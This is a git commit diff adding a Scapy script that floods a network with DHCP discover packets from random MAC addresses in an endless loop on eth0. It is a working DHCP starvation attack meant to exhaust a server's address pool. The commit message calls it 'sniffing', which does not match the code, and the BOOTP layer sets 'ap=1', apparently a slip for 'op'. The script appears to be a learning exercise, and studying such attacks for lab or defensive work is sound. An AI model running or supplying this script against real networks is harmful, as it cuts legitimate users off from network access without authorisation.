292c28f8f045496607a86efd9db817794a126ca9
Naimul-R <naimul.rabby08@gmail.com>
2026-04-18 12:18:00 +0600

    Writing script done for DHCP network sniffing.

--- Scapy/scapy_dhcp_starvation.py
+++ Scapy/scapy_dhcp_starvation.py
@@ -6,3 +6,19 @@ from scapy.all import *
 #when conf.checkIPaddr the response IP isn't checked
 #against sending IP address don't need to match
 conf.checkIPaddr = False
+
+# Create DHCP discover with destination IP = Broadcast
+# Source MAC address is a random MAC address
+# Source IP address = 0.0.0.0
+# Destination IP address = broadcast
+# Source port = 68 (DHCP/BOOTP client)
+# Destination port = 67 (DHCP/BOOTP server)
+# DHCP message type is discover
+dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) \
+                    /IP(src='0.0.0.0', dst='255.255.255.255') \
+                    /UDP(sport=68, dport=67) \
+                    /BOOTP(ap=1, chaddr=RandMAC()) \
+                    /DHCP(options=[('message-type', 'discover'), ('end')])
+
+# Send packet out of eth0 and loop the packet 
+sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)
